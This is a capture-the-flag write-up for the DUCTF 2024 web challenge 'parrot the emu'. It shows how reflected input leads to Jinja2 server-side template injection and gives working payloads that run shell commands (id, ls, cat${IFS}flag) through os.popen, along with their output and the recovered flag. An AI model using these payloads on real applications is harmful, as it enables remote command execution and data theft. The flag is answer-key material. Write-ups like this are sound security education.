# parrot the emu 

## Description
```
It is so nice to hear Parrot the Emu talk back

Author: richighimi

https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev 
```

## Provided Files
```
- parrot-the-emu.zip
```

## Writeup

Starting off we have a web application in which you can enter anything which will be returned to you (parrot talking back). <br/>
Knowing that our input gets reflected back to us we can test out the different vulnerabilites which work on input reflection. <br/>
Testing with `{{7*7}}` returns `49` indicating an `SSTI` vulnerability. <br/>

`Response-Headers`: <br/>
```
server: Werkzeug/2.0.3 Python/3.9.19
```

The `Python` server-header may indicate the usage of `Jinja2` template engine. <br/>
Using [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) we can find useful payloads which when tested returns important information. <br/>
```py
# Payload
{{ cycler.__init__.__globals__.os.popen('id').read() }}
# Response
uid=0(root) gid=0(root) groups=0(root) 

# Payload
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
# Response
app.py flag requirements.txt static templates 

# Payload -> ${IFS} == ' '
{{ cycler.__init__.__globals__.os.popen('cat${IFS}flag').read() }}
# Response
DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}
```